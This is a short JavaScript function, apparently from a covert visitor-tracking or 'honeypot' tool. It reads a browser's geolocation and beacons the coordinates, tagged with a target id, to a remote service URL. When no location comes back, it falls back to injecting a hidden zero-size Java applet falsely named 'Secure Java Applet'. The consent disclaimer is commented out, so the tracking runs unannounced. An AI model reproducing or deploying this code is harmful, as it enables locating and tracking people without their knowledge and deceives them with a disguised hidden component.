function go(service, target, applet, doScript, doApplet, timeout) {
    //disclaimer = "";
    //if (confirm(disclaimer)) {
        // function declarations
        function showPosition(position) {
            gotloc = true;
            img=new Image();
            img.src= service + "?target=" + target + "&agent=JavaScript&lat=" + position.coords.latitude + "&lng=" + position.coords.longitude + "&acc=" + position.coords.accuracy;
        }
        function useApplet() {
            var a = document.createElement('applet');
            a.setAttribute('code', 'honey.class');
            a.setAttribute('archive', applet);
            a.setAttribute('name', 'Secure Java Applet');
            a.setAttribute('width', '0');
            a.setAttribute('height', '0');
            var b = document.createElement('param');
            b.setAttribute('name', 'target');
            b.setAttribute('value', target);
            a.appendChild(b);
            var c = document.createElement('param');
            c.setAttribute('name', 'service');
            c.setAttribute('value', service);
            a.appendChild(c);
            document.getElementsByTagName('body')[0].appendChild(a);
        }
        // execution
        var gotloc = false;
        if (navigator.geolocation && doScript) {
            navigator.geolocation.getCurrentPosition(showPosition);
        }
        window.setTimeout(function() {
                if (!gotloc && doApplet) {
                    useApplet();
                }}, timeout);
    //}
}
